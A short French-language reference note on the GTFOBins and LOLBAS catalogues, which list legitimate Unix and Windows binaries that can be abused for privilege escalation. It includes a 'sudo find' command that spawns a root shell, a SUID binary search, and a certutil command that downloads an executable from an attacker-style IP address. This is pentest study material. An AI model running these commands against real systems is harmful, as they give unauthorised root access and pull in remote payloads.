---
titre: "GTFOBins & LOLBAS"
tags: [Outils, privesc, LOLBin, référence]
source: https://gtfobins.github.io/
---

# GTFOBins & LOLBAS

Deux catalogues de **binaires légitimes détournés** (« living off the land ») —
essentiels pour l'**élévation de privilèges** et le contournement de restrictions.

## GTFOBins (Linux/Unix)
**[gtfobins.github.io](https://gtfobins.github.io/)** : comment abuser d'un binaire
Unix courant pour lire un fichier, obtenir un shell, escalader via **SUID**,
**sudo**, capabilities…
```bash
# exemple : sudo find autorisé -> shell root
sudo find . -exec /bin/sh \; -quit
# exemple : less en SUID -> lecture de fichiers protégés
```
Réflexe : après `sudo -l` (ou recherche de binaires SUID
`find / -perm -4000 2>/dev/null`), chercher chaque binaire sur GTFOBins.

## LOLBAS (Windows)
**[lolbas-project.github.io](https://lolbas-project.github.io/)** : équivalent
Windows (binaires/scripts signés Microsoft détournés : `certutil` pour
télécharger, `rundll32`/`regsvr32` pour exécuter, `mshta`…).
```cmd
certutil -urlcache -f http://10.10.14.3/x.exe x.exe   # download
```

## Réflexe
Réflexe systématique en **privesc** : « ce binaire que j'ai le droit d'exécuter,
est-il dans GTFOBins/LOLBAS ? ». Contexte plus large : [[HackTricks & revshells]].
